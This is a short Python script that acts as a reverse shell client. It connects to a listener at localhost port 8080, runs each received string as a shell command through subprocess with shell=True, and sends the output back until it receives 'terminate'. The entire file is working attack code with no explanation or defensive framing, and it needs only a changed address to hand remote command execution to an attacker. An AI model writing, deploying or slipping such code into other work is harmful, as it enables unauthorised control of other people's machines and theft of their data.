import socket    
import subprocess 

def connect():
    s = socket.socket()
    s.connect(('localhost', 8080)) 

    while True:
        command = s.recv(1024)

        if 'terminate' in command.decode():
            s.close()
            break
        else:   

            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            s.send(CMD.stdout.read()) 
            s.send(CMD.stderr.read())

def main():
    connect()
main()
